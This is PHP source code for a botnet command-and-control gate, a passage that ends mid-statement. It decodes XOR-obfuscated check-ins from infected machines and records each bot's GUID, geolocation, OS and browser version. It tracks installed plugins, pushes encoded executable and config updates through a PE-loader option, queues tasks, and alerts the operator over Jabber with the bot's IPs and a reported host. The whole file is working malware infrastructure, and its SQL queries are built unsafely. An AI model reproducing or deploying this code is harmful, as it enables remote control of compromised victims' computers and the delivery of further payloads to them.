
error_reporting (E_ERROR | E_PARSE);

# DATABASE MOD #####################################################################################

if (function_exists('mysqli_query') === false) 
{
	writelog("error.log", "Plz, install <font color='green'>MySQLi</font></center>");
	die();
}

## DATABASE class	
class DB extends mysqli
{
// properties
	var $connected;
// constructor
	function __construct() 
	{
		global $db_host, $db_user, $db_pswd, $db_database;	
		$this->connected = false;
		@ parent::__construct($db_host, $db_user, $db_pswd, $db_database);
		if( mysqli_connect_errno() )  
		{  
			die(  '<div class="error">Cannot connect to database </div>' ) ;
			return $this->connected;
		}
		$this->connected = true;
	}
// destructor
	function __destruct() 
	{
		if($this->connected) $this->close();
	}
	function GetConfigs()
	{
		$sql = "SELECT * FROM configs_t";
		$res = $this->query($sql);
		if( !$this->affected_rows ) return 0;
		for($resarr=array(); $row = $res->fetch_assoc(); )
		{
			$key = $row['cKey'];
			$resarr[$key] = $row['cValue'];
		}
		return  $resarr;
	}
	function InstallConfigs($ini)
	{
		$count = 0;
		if( is_array($ini) ) foreach($ini as $k=>$v)
		{
			$sql = "INSERT INTO configs_t (cKey, cValue) VALUES('$k','$v')";
			$this->query($sql);
			if( $this->affected_rows == 1 ) $count++;
		}	
		return $count;
	}
};

	$db = new DB;

# FILES MOD ########################################################################################
##
function GetFile($name)
{
	global $db;	
	$sql = "SELECT * FROM files_t WHERE fName='$name'";
	$res = $db->query($sql);
	if( $db->affected_rows )
	{
		return $res->fetch_array();
	}
	return FALSE;
}
define('FRAG_SIZE', 50000);

# FUNCTS MOD #######################################################################################

	function getip(&$ip, &$inip) 
	{
		$ip = $inip = $_SERVER ["REMOTE_ADDR"];
		if (isset ($_SERVER ["HTTP_X_FORWARDED_FOR"])) {
			if (isset ($_SERVER ["HTTP_X_REAL_IP"]))
				$inip = $_SERVER ["HTTP_X_REAL_IP"];
			else
				$inip = $_SERVER ["HTTP_X_FORWARDED_FOR"];
		}
		if (!strcmp($ip, "127.0.0.1")) {
			$ip = $inip = $_SERVER ["HTTP_X_REAL_IP"];
		}
	}
	
	function ascii2hex($ascii) 
	{
		$hex = '';
		for ($i = 0; $i < strlen($ascii); $i++) {
			$byte = strtoupper(dechex(ord($ascii{$i})));
			$byte = str_repeat('0', 2 - strlen($byte)) . $byte;
			$hex .= $byte;
		}
		return $hex;
	}
	
	function bot_setonline($bot_ver, $os_bot, $ie_bot, $usertp_bot, $id_bot) 
	{
		global $db;
		if ( ($os_bot != '?') && ($ie_bot != '?') && ($usertp_bot != '?') )
			$qp = ", os_version_bot = '$os_bot', ie_version_bot = '$ie_bot', user_type_bot = '$usertp_bot'";
		$sql = "UPDATE bots_t SET date_last_online_bot =  CONVERT_TZ(now(),@@time_zone,'+0:00') , status_bot = 'online', ver_bot = '$bot_ver'$qp
				WHERE id_bot = $id_bot LIMIT 1";
		$db->query($sql);
		return true;
	}

	function bot_setlastrun($id_bot) 
	{
		global $db;
		$sql = "UPDATE bots_t SET date_last_run_bot =  CONVERT_TZ(now(),@@time_zone,'+0:00') WHERE id_bot = $id_bot LIMIT 1";
		$res = $db->query($sql);
		return true;
	}
##
	function GetTimeStamp($date) 
	{
	  list($year, $month, $day, $hour, $minute, $second) = preg_split('/[ :\/.-]/', $date, -1, PREG_SPLIT_NO_EMPTY);
	  return gmmktime ($hour, $minute, $second, $month, $day, $year);
	}
## write log to db
	function writelog ($type, $data)
	{
		$type = strtolower($type[0]);
		$data = addslashes(date("r") . " - " . $data);
		global $db;
		$sql = "INSERT DELAYED INTO logs_t VALUES(NULL, '$type', '$data')";
		$db->query($sql);
		return $db->affected_rows;
	}
##
	function GetBotInfo($ip)
	{
		global $db;
		$long = sprintf("%u", ip2long($ip));
		$sql = "SELECT cn as country_name, tr as region, tn as city from geo_city, geo_country where cc=tc and locId=
					(SELECT loc_id FROM geo_loc WHERE $long BETWEEN start AND end LIMIT 1)";
					

		$res = $db->query($sql);
		if( $db->affected_rows )
		{
			$info = $res->fetch_object();
			return $info;
		}
		return 0;
	}
## decode data from bot	
	function DeCode($content)
	{
		$res = '';
		for($i = 0; $i < strlen($content); $i++) 
		{
			$num = ord($content[$i]);
			if( $num != 219) $res .= chr($num^219); 
		}
		return $res;
	}
##
	function OutEncodedContent($cmd, $fname = FALSE)
	{
		// preparing command
		if( $fname )
		{
			// adding spaces - cmd length must be % 6
			while( strlen($cmd) % 6 != 5) $cmd .=" ";
			$cmd .= "\n";
		}
		for($i=0; $i<strlen($cmd); $i++) $cmd[$i] = chr(ord($cmd[$i])^219);
		echo base64_encode($cmd);
	
		// preparing file content
		if( $fname )
		{
			//	$db->query("SET max_allowed_packet=".(5*1024*1024));
			$file = GetFile($fname);
			if( !$file ) die(); //die('FILE NOT FOUND');
			list($id, $fname, $content) =  $file;
			$size = strlen($content);
			
			for($i = 0; $i < $size; $i += 1002) 
			{
				$part = substr($content, $i, 1002);
				$epart = '';
				for($j = 0; $j < strlen($part); $j++)
				{
					$epart .= chr(ord($part[$j])^219);
				}
				unset($part);
				echo base64_encode($epart);
				flush();
			}
		}
	}
	
# JABBER CODE ######################################################################################

class Jabber
{
	var $server;
	var $port;
	var $username;
	var $password;
	var $resource;
	var $jid;
	var $streamId;
	var $packetQueue;
	var $connector;
	var $activeSocket;

	function Jabber()
	{
		$this->server = '127.0.0.1';
		$this->port	 = 5222;

		$this->username = '';
		$this->password = '';
		$this->resource = NULL;

		$this->packetQueue = array();
	}

	function openSocket($server, $port)
	{
		if($this->activeSocket = fsockopen($server, $port))
		{
			socket_set_blocking($this->activeSocket, 0);
			socket_set_timeout($this->activeSocket, 31536000);
			return true;
		}
		return false;
	}

	function closeSocket()
	{
		return fclose($this->activeSocket);
	}

	function writeToSocket($data)
	{
		return fwrite($this->activeSocket, $data);
	}

	function readFromSocket($chunksize)
	{
		return fread($this->activeSocket, $chunksize);
	}

	function connect()
	{
		if($this->openSocket($this->server, $this->port))
		{
			$this->sendPacket("<?xml version='1.0' encoding='UTF-8' ?".">\n");
			$this->sendPacket("<stream:stream to='{$this->server}' xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams'>\n");
			sleep(2);
			if($this->checkConnected())return true;
		}
		return false;
	}

	function disconnect()
	{
		sleep(1);
		$this->sendPacket("</stream:stream>");
		$this->closeSocket();
	}

	function sendAuth()
	{
		$this->authId	 = "auth_".md5(time());
		$this->resource = ($this->resource != NULL) ? $this->resource : ("Class.Jabber.PHP ".md5($this->authId));
		$this->jid			= "{$this->username}@{$this->server}/{$this->resource}";

		$payload = "<username>{$this->username}</username>";
		$packet	= $this->sendIq(NULL, 'get', $this->authId, "jabber:iq:auth", $payload);

		if($this->getInfoFromIqType($packet) == 'result' && $this->getInfoFromIqId($packet) == $this->authId)
		{
			if(function_exists('mhash') && isset($packet['iq']['#']['query'][0]['#']['sequence'][0]["#"]) && isset($packet['iq']['#']['query'][0]['#']['token'][0]["#"]))
			{
				return $this->sendAuth0k($packet['iq']['#']['query'][0]['#']['token'][0]["#"], $packet['iq']['#']['query'][0]['#']['sequence'][0]["#"]);
			}
			else if(function_exists('mhash') && isset($packet['iq']['#']['query'][0]['#']['digest']))
			{
				$payload = "<username>{$this->username}</username><resource>{$this->resource}</resource><digest>".bin2hex(mhash(MHASH_SHA1, $this->streamId.$this->password))."</digest>";
				$packet = $this->sendIq(NULL, 'set', $this->authId, "jabber:iq:auth", $payload);
				if($this->getInfoFromIqType($packet) == 'result' && $this->getInfoFromIqId($packet) == $this->authId)return true;
			}
			else if($packet['iq']['#']['query'][0]['#']['password'])
			{
				$payload = "<username>{$this->username}</username><password>{$this->password}</password><resource>{$this->resource}</resource>";
				$packet = $this->sendIq(NULL, 'set', $this->authId, "jabber:iq:auth", $payload);
				if($this->getInfoFromIqType($packet) == 'result' && $this->getInfoFromIqId($packet) == $this->authId)return true;
			}
		}
		return false;
	}

	function sendPacket($xml)
	{
		return $this->writeToSocket(trim($xml));
	}

	function listen()
	{
		$incoming = '';
		while($line = $this->readFromSocket(4096))$incoming .= $line;
		$incoming = trim($incoming);
		if($incoming != '')
		{
			$temp = $this->splitIncoming($incoming);
			for($a = 0; $a < count($temp); $a++)$this->packetQueue[] = $this->xmlize($temp[$a]);
		}
		return true;
	}

	function sendMessage($to, $type = "normal", $id = NULL, $content = NULL, $payload = NULL)
	{
		if($to && is_array($content))
		{
			if(!$id)$id = $type.'_'.time();

			$content = $this->arrayHtmlSpecialChars($content);
			$xml = "<message to='$to' type='$type' id='$id'>\n";
			if(!empty($content['subject']))$xml .= "<subject>".$content['subject']."</subject>\n";
			if(!empty($content['thread']))$xml .= "<thread>".$content['thread']."</thread>\n";

			$xml .= "<body>{$content['body']}</body>\n{$payload}</message>\n";

			if($this->sendPacket($xml))return true;
		}
		return false;
	}

	function sendPresence($type = NULL, $to = NULL, $status = NULL, $show = NULL, $priority = NULL)
	{
		$xml = "<presence";
		$xml .= ($to) ? " to='$to'" : '';
		$xml .= ($type) ? " type='$type'" : '';
		$xml .= ($status || $show || $priority) ? ">\n" : " />\n";

		$xml .= ($status) ? " <status>$status</status>\n" : '';
		$xml .= ($show) ? " <show>$show</show>\n" : '';
		$xml .= ($priority) ? " <priority>$priority</priority>\n" : '';

		$xml .= ($status || $show || $priority) ? "</presence>\n" : '';

		return $this->sendPacket($xml);
	}

	function getFromQueueById($packetType, $id)
	{
		$foundMessage = false;
		foreach ($this->packetQueue as $key => $value)if($value[$packetType]['@']['id'] == $id)
		{
			$foundMessage = $value;
			unset($this->packetQueue[$key]);
			break;
		}
		return is_array($foundMessage) ? $foundMessage : false;
	}

	function sendIq($to = NULL, $type = 'get', $id = NULL, $xmlns = NULL, $payload = NULL, $from = NULL)
	{
		if(!preg_match("/^(get|set|result|error)$/", $type))unset($type);
		else if($id && $xmlns)
		{
			$xml = "<iq type='{$type}' id='{$id}'";
			if($to)$xml .= " to='{$to}'";
			if($from)$xml .= " from='{$from}'";
			$xml .= "><query xmlns='$xmlns'>$payload</query></iq>";

			$this->sendPacket($xml);
			sleep(1);
			$this->listen();

			return (preg_match("/^(get|set)$/", $type)) ? $this->getFromQueueById("iq", $id) : true;
		}
		return false;
	}

	function sendAuth0k($zerokToken, $zerokSequence)
	{
		$zerokHash = bin2hex(mhash(MHASH_SHA1, $this->password));
		$zerokHash = bin2hex(mhash(MHASH_SHA1, $zerokHash.$zerokToken));

		for($a = 0; $a < $zerokSequence; $a++)$zerokHash = bin2hex(mhash(MHASH_SHA1, $zerokHash));

		$payload = "<username>{$this->username}</username><hash>$zerokHash</hash><resource>{$this->resource}</resource>";
		$packet = $this->sendIq(NULL, 'set', $this->authId, "jabber:iq:auth", $payload);
		if($this->getInfoFromIqType($packet) == 'result' && $this->getInfoFromIqId($packet) == $this->authId)return true;
		return false;
	}

	function listenIncoming()
	{
		$incoming = '';
		while($line = $this->readFromSocket(4096))$incoming .= $line;
		$incoming = trim($incoming);
		return $this->xmlize($incoming);
	}

	function checkConnected()
	{
		$incomingArray = $this->listenIncoming();
		if(is_array($incomingArray))if($incomingArray["stream:stream"]['@']['from'] == $this->server && $incomingArray["stream:stream"]['@']['xmlns'] == "jabber:client" && $incomingArray["stream:stream"]['@']["xmlns:stream"] == "http://etherx.jabber.org/streams")
		{
			$this->streamId = $incomingArray["stream:stream"]['@']['id'];
			return true;
		}
		return false;
	}

	function splitIncoming($incoming)
	{
		$temp = preg_split("/<(message|iq|presence|stream)/", $incoming, -1, PREG_SPLIT_DELIM_CAPTURE);
		$array = array();
		$c		 = count($temp);
		for($a = 1; $a < $c; $a = $a + 2)$array[] = "<".$temp[$a].$temp[($a + 1)];
		return $array;
	}

	function arrayHtmlSpecialChars($array)
	{
		if(is_array($array))foreach($array as $k => $v)$v = is_array($v) ? $this->arrayHtmlSpecialChars($v) : htmlspecialchars($v);
		return $array;
	}

	function getInfoFromIqType($packet)
	{
		return is_array($packet) ? $packet['iq']['@']['type'] : false;
	}

	function getInfoFromIqId($packet)
	{
		return is_array($packet) ? $packet['iq']['@']['id'] : false;
	}

	function xmlize($data)
	{
		$vals = $index = $array = array();
		$parser = xml_parser_create();
		xml_parser_set_option($parser, XML_OPTION_CASE_FOLDING, 0);
		xml_parser_set_option($parser, XML_OPTION_SKIP_WHITE, 1);
		xml_parse_into_struct($parser, $data, $vals, $index);
		xml_parser_free($parser);

		$i = 0;
		$tagName = $vals[$i]['tag'];
		$array[$tagName]['@'] = $vals[$i]['attributes'];
		$array[$tagName]['#'] = $this->xmlDepth($vals, $i);

		return $array;
	}

	function xmlDepth($vals, &$i)
	{
		$children = array();
		if(!empty($vals[$i]['value']))array_push($children, trim($vals[$i]['value']));

		while(++$i < count($vals))switch($vals[$i]['type'])
		{
			case 'cdata':
				array_push($children, trim($vals[$i]['value']));
				break;

			case 'complete':
				$tagName = $vals[$i]['tag'];
				$size = empty($children[$tagName]) ? 0 : sizeof($children[$tagName]);
				$children[$tagName][$size]['#'] = empty($vals[$i]['value']) ? '' : trim($vals[$i]['value']);
				if(!empty($vals[$i]['attributes']))$children[$tagName][$size]['@'] = $vals[$i]['attributes'];
				break;

			case 'open':
				$tagName = $vals[$i]['tag'];
				$size = empty($children[$tagName]) ? 0 : sizeof($children[$tagName]);
				if(!empty($vals[$i]['attributes']))
				{
					$children[$tagName][$size]['@'] = $vals[$i]['attributes'];
					$children[$tagName][$size]['#'] = $this->xmlDepth($vals, $i);
				}
				else $children[$tagName][$size]['#'] = $this->xmlDepth($vals, $i);
				break;

			case 'close':
				return $children;
				break;
		}
		return $children;
	}
}
	
# MAIN CODE ########################################################################################
	
	$isActive = false;

	if( !isset($_POST['data']) ) die();
	// base64 encoded text can contains symbols '+' - 
	// after send by POST or GET his converted to " "
	else $DATA = str_replace(" ","+",$_POST['data']); 

	// декодируем параметры
	$data = base64_decode($DATA);
	$enc_str = explode("&", DeCode($data));
	
	if( is_array($enc_str) ) 
	{
		$_PARAMS = Array();
		foreach($enc_str as $param)
		{
			list($key, $val) = explode("=", $param);
			$_PARAMS[$key] = $val;
		}
	}
	if( !count($_PARAMS) ) { writelog("error.log", "Parsing params error {$DATA}"); die(); }

	$isActive = false;

	$icfg = $db->GetConfigs();		
	if( isset($_PARAMS['guid']) ) $guid = escapeshellcmd( $_PARAMS['guid'] ); else $guid = 0;
	if ($guid) 
	{
		$guid = str_replace('\\\'', '\'', $guid);
		$guid = str_replace('\'', '\'\'', $guid);
		
		$bot_ver = intval($_PARAMS['ver']);
		$stat_bot = escapeshellcmd( strtolower($_PARAMS['stat']) );
		$os_bot = escapeshellcmd( $_PARAMS['os'] );
		$ie_bot = escapeshellcmd( $_PARAMS['ie'] );
		$usertp_bot = escapeshellcmd( $_PARAMS['ut'] );
		$cpu = escapeshellcmd( $_PARAMS['cpu'] );
		$wake_time = (int)escapeshellcmd( $_PARAMS['wake'] ) ? (int)escapeshellcmd( $_PARAMS['wake'] ) : 0;
				
		if (!@$os_bot) $os_bot = "?";
		if (!@$ie_bot) $ie_bot = "?";
		if (!@$usertp_bot) $usertp_bot = "?";
		if (!@$cpu) $cpu = 0;
		else $cpu = intval($cpu);
		
		// Выбор бота по GUID'у
		$sql = "SELECT * FROM bots_t WHERE guid_bot = '$guid' LIMIT 1";
		$main_res = $db->query($sql);
			
		// Известно ли нам что-либо о месторасположении бота, если бот есть в базе?
		$geoip_update = FALSE;
		if ( @$main_res && $db->affected_rows ) 
		{
			// Запоминаем id бота
			$mres = $main_res->fetch_array();
			$id_bot = $mres['id_bot'];
			$blocked = $mres['blocked'];
		 
			// обновляем количество секунд до следующего обращения к гейту
			if( $wake_time ) 
			{
				$sql = "UPDATE LOW_PRIORITY bots_t SET wake_time_bot=$wake_time WHERE id_bot=$id_bot";
				$db->query($sql);
				if( $db->affected_rows == -1 ) writelog("error.log", "Wrong query : \" $sql \"");
			}		 
		 
			// Делаем стафф
			$sql = "SELECT *, TO_DAYS(CONVERT_TZ(now(),@@time_zone,'+0:00')) nowday FROM bots_t, city_t, country_t WHERE bots_t.id_bot = $id_bot 
					AND bots_t.fk_city_bot = city_t.id_city AND city_t.fk_country_city = country_t.id_country LIMIT 1";
			
			$res = $db->query($sql);
			if (!@$res) 
			{
				writelog("error.log", "Wrong query : \" $sql \"");
				die();
			}
			if (!$db->affected_rows) 
			{
				$mres = $res->fetch_array();
				$id_cn = $mres['fk_country_city']; // for loader
				$geoip_update = TRUE;
			}
			else 
			{
				// Подошло ли время обновить инфу о geo-ip расположении бота?
				$geoip_uci = (int)$icfg['geoip_update_check_interval_days'];
				if (strlen($geoip_uci) == 0) 
				{
					$geoip_uci = 30;
					writelog('error.log', 'Cannot read geoip_update_check_interval_days from config. Using '.$geoip_uci);
				}
				
				$mres = $res->fetch_array();
				$bot_lgcb = (int)$mres['date_last_geoip_check_bot'];
				$now_day =  (int)$mres['nowday'];

				if ( ($now_day - $bot_lgcb) > $geoip_uci ) 
				{
					$geoip_update = TRUE;
					writelog('debug.log', "Gonna update date_last_geoip_check_bot for current bot ($id_bot)");
				}
				$id_cn = $mres['fk_country_city']; // for loader
			}
		}
		// Смотрим - есть ли такой бот? Надо ли нам про'update'ить geoip-положение?
		if ( (!(@($main_res)) || $db->affected_rows == 0) || $geoip_update === TRUE) 
		{
			// Мониторим GEOIP-положение исходим из внутреннего IP бота
			getip($ip, $inip);
			
			$spaces = GetBotInfo($inip);				
			
			// Есть ли в базе страна бота?		
			! ($spaces -> country_name) ? $country_name = 'Unknown' : $country_name = str_replace('\'', '\'\'', $spaces -> country_name);
			
			if ($country_name == 'Unknown') 
				writelog('error.log', "Cannot find country name for bot ($id_bot) with ip : $inip");

			
			$sql = "SELECT * FROM country_t WHERE name_country LIKE '$country_name' LIMIT 1";				
			$cn = $db->query($sql);
			
			// Страны бота нет
			if (!(@($cn)) || $db->affected_rows == 0) 
			{
				$sql = " INSERT INTO country_t VALUES (null, '$country_name')";
				$res = $db->query($sql);
				$id_cn = $db->insert_id;							 
				if ($id_cn == 0) 
				{
					writelog("error.log", "Wrong query : \" $sql \"");
					die();
				}
				
				// Город бота тоже - вставляем сразу
				( (! ($spaces -> city) ) ) || ( !strlen(trim($spaces -> city)) ) ? $city = 'Unknown' : $city = str_replace('\'', '\'\'', $spaces -> city);
				( (! ($spaces -> region) ) ) || ( !strlen(trim($spaces -> region)) ) ? $region = 'Unknown' : $region = str_replace('\'', '\'\'', $spaces -> region);
				
				if ($region == 'Unknown') writelog('error.log', "Cannot find region name for bot ($id_bot) with ip : $inip");
							
				$sql = " INSERT INTO city_t VALUES (null, '$city', '$region', $id_cn)";
				$res = $db->query($sql);
				$id_city = $db->insert_id;
				if ($id_city === 0) 
				{
					writelog("error.log", "Wrong query : \" $sql \"");
					$db->rollback();
					die();
				}
			}
			// Страна бота есть
			else 
			{
				$mres = $cn->fetch_array();
				$id_cn = $mres['id_country'];
				( (! ($spaces -> city) ) ) || ( !strlen(trim($spaces -> city)) ) ? $city = 'Unknown' : $city = str_replace('\'', '\'\'', $spaces -> city);
				( (! ($spaces -> region) ) ) || ( !strlen(trim($spaces -> region)) ) ? $region = 'Unknown' : $region = str_replace('\'', '\'\'', $spaces -> region);
				
				if ($region == 'Unknown') 
					writelog('error.log', "Cannot find region name for bot ($id_bot) with ip : $inip");
				
				// Есть ли город бота в базе? (Штат тоже учитываем, ибо одинаковые названия городов могут быть в разных штатах)
				$sql = "SELECT id_city FROM city_t WHERE name_city LIKE '$city' AND state LIKE '$region' AND fk_country_city=$id_cn LIMIT 1";
				$res = $db->query($sql);
				
				// Город бота есть
				if ((@($res)) && $db->affected_rows > 0) 
				{
					$mres = $res->fetch_array();
					$id_city = $mres['id_city'];
				}
				// Города бота нет
				else 
				{
					$sql = " INSERT INTO city_t VALUES (null, '$city', '$region', $id_cn)";
					$res = $db->query($sql);
					$id_city = $db->insert_id;
					if ($id_city == 0) 
					{
						writelog("error.log", "Wrong query : \" $sql \"");
						die();
					}
				}
			}
			
			// Update местонахождения бота
			if ($geoip_update) 
			{
				$sql = "UPDATE bots_t SET fk_city_bot = $id_city, date_last_geoip_check_bot = TO_DAYS(CONVERT_TZ(now(),@@time_zone,'+0:00')) WHERE id_bot = $id_bot LIMIT 1";
				$res = $db->query($sql);
				if ($db->affected_rows != 1) 
				{
					writelog("error.log", "Wrong query : \" $sql \"");
					die();
				}
			}
			// Вставка нового бота в базу
			else 
			{
				$sql = " INSERT INTO bots_t VALUES (null, '$guid', '$bot_ver', '$stat_bot', '0', $id_city, NULL, NULL, '$os_bot', 
						'$ie_bot', '$usertp_bot', NULL, 0, 0, $wake_time)";
				$res = $db->query($sql);

				$id_bot = $db->insert_id;
                
				if ($id_bot == 0) 
				{
					writelog("error.log", "Wrong query : \" $sql \"");
					$db->rollback();
					die();
				}
                
                # add all unlimits tasks to bot
                $res = $db->query('SELECT * FROM tasks_t WHERE isUnlimit = 1');
                while ($row = $res->fetch_assoc()){
                    $db->query('INSERT INTO loads_t(fk_bot_id, fk_task_id) VALUES('.$id_bot.', '.$row['tskId'].')');    
                }
			}
		}
		// Update'им статус бота на online и проставляем стафф
		bot_setonline($bot_ver, $os_bot, $ie_bot, $usertp_bot, $id_bot);
		
		// jabber notifier
		if ( isset($_PARAMS['jm']) )
		{
			// getting config
			$jn_host = $icfg['jn_host'];
			if ( !isset($jn_host) )
			{
				writelog("error.log", "There are no any jabber's notifier options at config. Installing defaults");
				$icfgtmp['jn_host'] = '127.0.0.1';
				$icfgtmp['jn_port'] = '5222';
				$icfgtmp['jn_user'] = 'login';
				$icfgtmp['jn_passw'] = 'passw';
				$icfgtmp['jn_userto'] = 'receiver';
				$db->InstallConfigs($icfgtmp);
			}
			else
			{
				// 
				// other settigns
				// 
				$jn_port = $icfg['jn_port'];
				$jn_user = $icfg['jn_user'];
				$jn_passw = $icfg['jn_passw'];
				$jn_userto = $icfg['jn_userto'];
			
				// 
				// preparing message
				// 
				$msg = '';
				// guid
				$msg .= "Bot Guid   :   $guid\n";
				// geoinfo
				$sql = "SELECT name_country FROM country_t WHERE id_country = $id_cn LIMIT 1";
				$res = $db->query($sql);
				if (!$res)
				{
					writelog("error.log", "Wrong query : \" $sql \"");
				}
				else
				{
					list($country_name) = $res->fetch_array();
					$msg .= "Country   :   $country_name\n";
				}
				// ips (latest 5 ips)
				$sql = "SELECT ip FROM ip_t WHERE fk_bot = $id_bot ORDER BY id DESC LIMIT 5";
				$res = $db->query($sql);
				if (!(@($res))) 
				{
					writelog("error.log", "There are no ip for bot? : \" $sql \"");
				}
				else
				{
					$msg .= "IPs   :  ";
					while ( list($ip) = $res->fetch_array() )
					{
						$msg .= "$ip, ";
					}
					$msg = substr($msg, 0, -2) . "\n";
				}
				// content (host)
				$jm = base64_decode( $_PARAMS['jm'] );
				$parts = parse_url($jm);
				$msg .= "\n\n{$parts['host']}";
				
				// 
				// sending
				// 
				$jab = new Jabber;
				$jab->server   = $jn_host;
				$jab->port     = $jn_port;
				$jab->username = $jn_user;
				$jab->password = $jn_passw;
				if($jab->connect())
				{
					$r = $jab->sendAuth();
					$r = $jab->sendPresence(NULL, NULL, "online");
					$r = $jab->sendMessage($jn_userto, "normal", NULL, array("body" => $msg));
					$r = $jab->disconnect();
					writelog("debug.log", "Jabber message was sended   { $msg }");
				}
				else
				{
					writelog("error.log", "Could not connect to jabber server ( $jn_host:$jn_port:$jn_user:$jn_passw )");
				}
			}
		}
		
		// plugins
		$plg = $_PARAMS['plg'];
		$plgstat = $_PARAMS['plgstat'];
		if (@$plg)
		{
			// getting current plugins of bot from query
			$plg = str_replace('\\;', ';', $plg);
			$plg = str_replace('^', '', $plg);
			$match = preg_split('[;]', $plg);
			$cnt1 = count($match);
			
			$match2 = preg_split('[;]', $plgstat);

			$sqlp = '';
			$reqplug[] = "";
			$reqstat[] = "";
			for ($i = 0; $i < $cnt1; $i++) 
			{
				$plugin = $match[$i];
				
				$reqplug[$i] = $match[$i];
				$reqstat[$i] = $match2[$i];
				
				$sqlp .= " plugin = '$plugin'";
				if ($i + 1 != $cnt1) $sqlp .= " OR ";
			}
			
			// getting count of plugins of bot (relevant to plugins from current query)
			$sql = "SELECT COUNT(*) FROM plugins WHERE ( $sqlp ) AND fk_bot = '$id_bot'";
			$res = $db->query($sql);
			if (!@$res) 
			{
				writelog("error.log", "Wrong query : \" $sql \"");
				die();
			}
			
			// getting count of plugins of bot (total)
			$sql = "SELECT COUNT(*) FROM plugins WHERE fk_bot = '$id_bot'";
			$res2 = $db->query($sql);
			if (!@$res2) 
			{
				writelog("error.log", "Wrong query : \" $sql \"");
				die();
			}

			// is there are some plugins at db ?
			if ( $res->num_rows && $res2->num_rows ) 
			{
				// yeah, need to synchronize this stuff
				list($cnt2) = $res->fetch_row();
				list($cnt3) = $res2->fetch_row();
					
				if ($cnt1 != $cnt2 || $cnt2 != $cnt3)
				{
					//writelog("debug.log", "[$guid] : [cnt1 = $cnt1] : [cnt2 = $cnt2] : [cnt3 = $cnt3] : [plg = \"$plg\"]");
					// keeping plugins & statuses
					$bckplug[] = "";
					$bckstat[] = "";
					if ($cnt2)
					{
						$sql = "SELECT plugin, status FROM plugins WHERE fk_bot = '$id_bot' LIMIT $cnt2";
						$res = $db->query($sql);
						if ( !$db->affected_rows || !is_object($res) ) 
						{
							writelog("error.log", "Wrong query : \" $sql \"");
							die();
						}
						for ($i = 0; list($plugin, $status) = $res->fetch_array();) 
						{
							if ($status != 0)
							{
								$bckplug[$i] = $plugin;
								$bckstat[$i] = $status;
								$i++;
							}
						}
					}
			
					// deleting all plugins for this bot
					$sql = "DELETE FROM plugins WHERE fk_bot = '$id_bot'";
					$res = $db->query($sql);
					
					// inserting all plugins of bot
					for ($i = 0; $i < $cnt1; $i++) 
					{
						$plugin = $match[$i];
						
						// searching for status of plugin
						$status = 0;
						$indx = array_search($plugin, $bckplug);
						if ($indx !== false)
						{
							$status = $bckstat[$indx];
						}
						
						$sql = "INSERT DELAYED INTO plugins VALUES(NULL, '$id_bot', '$plugin', $status)";
						$res = $db->query($sql);
					}
				}
			}
			else
			{
				for ($i = 0; $i < $cnt1; $i++) 
				{
					$plugin = $match[$i];
					$sql = "INSERT DELAYED INTO plugins VALUES(NULL, '$id_bot', '$plugin', 0)";
					$res = $db->query($sql);
				}
			}
		}

## UPDATE BOT
		$skip_update = $icfg['skip_update'];
		if ( $skip_update != 1 && isset($_PARAMS['md5']) && !strcmp($stat_bot, 'online') ) 
		{
			// Даём команду на update, если версия бота устарела
			$md5 = escapeshellcmd( $_PARAMS['md5'] );
			if (!@$md5) writelog("error.log", "MD5 parameter is not found! : bot \"$guid\"");
			else
			{
				// смотрим, есть ли задание по обновлению тела бота
				$sql = "SELECT fName,fMd5,upId,tskPeLoader,tskReplExe,tskId FROM tasks_t,files_t,loads_t WHERE fId=fk_file_id 
						AND fType='b' AND fk_task_id=tskId AND upStatus=0 AND tskState='1' AND fk_bot_id=$id_bot LIMIT 1";
				$res = $db->query($sql);
				// если есть
				if( $db->affected_rows && is_object($res) )
				{
					list($fname, $dbmd5, $upId, $peldr, $justreplace, $tid) = $res->fetch_array();
					if( $md5 !== $dbmd5 )
					{
						writelog("debug.log", "UPDATE for bot \"$guid\" : bot_ver = $bot_ver : md5 = $md5 : file = $fname");
						$cmd = "UPDATE<br>$tid<br>peldr=$peldr<br>justreplace=$justreplace";
						OutEncodedContent($cmd, $fname);
						$isActive = true;
						$sql = "UPDATE loads_t SET upStatus=1,upStartTime=CONVERT_TZ(now(),@@time_zone,'+0:00') WHERE upId=$upId";
						$db->query($sql);
						if( $db->affected_rows != 1 ) writelog("error.log", "Wrong query { $sql }");
						die();
					} 
					else 
					{
						// если тела одинкавые - значит задание выполнено
						$sql = "UPDATE loads_t SET upStatus=3,upStartTime=CONVERT_TZ(now(),@@time_zone,'+0:00') WHERE upId=$upId";
						$db->query($sql);
						if( $db->affected_rows != 1 ) writelog("error.log", "Wrong query { $sql }");
					}
				}
			}
		}

## UPDATE CONIG
		$skip_update_config = $icfg['skip_update_config'];
		if ( $skip_update_config != 1 && !strcmp($stat_bot, 'online') ) 
		{
			// Читаем CRC из конфига и сравниваем с тем, что прислал бот
			// Если CRC разные, значит даём боту команду на обновление конфига
			$ccrc = escapeshellcmd( $_PARAMS['ccrc'] );
			if (!@$ccrc) writelog("error.log", "CCRC parameter is not found! : bot \"$guid\"");
			else
			{
				// смотрим, есть ли задание
				$sql = "SELECT fName,fMd5,upId,tskId FROM tasks_t,files_t,loads_t WHERE fId=fk_file_id 
						AND fType='c' AND fk_task_id=tskId AND upStatus=0 AND tskState='1' AND fk_bot_id=$id_bot LIMIT 1";
				$res = $db->query($sql);
				// если есть
				if( $db->affected_rows && is_object($res) )
				{
					list($fname, $dbcrc32, $upId, $tid) = $res->fetch_array();
					if( $ccrc !== $dbcrc32 )
					{
						writelog("debug.log", "UPDATE_CONFIG for bot \"$guid\" : bot_ver = $bot_ver : crc32 = $dbcrc32 : file = $fname");
						$cmd = "UPDATE_CONFIG<br>$tid";
						OutEncodedContent($cmd, $fname);
						$isActive = true;
						$sql = "UPDATE loads_t SET upStatus=1,upStartTime=CONVERT_TZ(now(),@@time_zone,'+0:00') WHERE upId=$upId";
						$db->query($sql);
						if( $db->affected_rows != 1 ) writelog("error.log", "Wrong query { $sql }");						
						die();
					}
					else 
					{
						// если конфиги одинкавые - значит задание выполнено
						$sql = "UPDATE loads_t SET upStatus=3,upStartTime=CONVERT_TZ(now(),@@time_zone,'+0:00') WHERE upId=$upId";
						$db->query($sql);
						if( $db->affected_rows != 1 ) writelog("error.log", "Wrong query { $sql }");
					}
				}
			}
		}

		getip($ip, $inip);
		
		if (strlen($inip))	$sqlp = ", ($id_bot, '$inip'	)";
		$sql = "INSERT DELAYED INTO ip_t (fk_bot, ip) VALUES ($id_bot, '$ip')$sqlp";
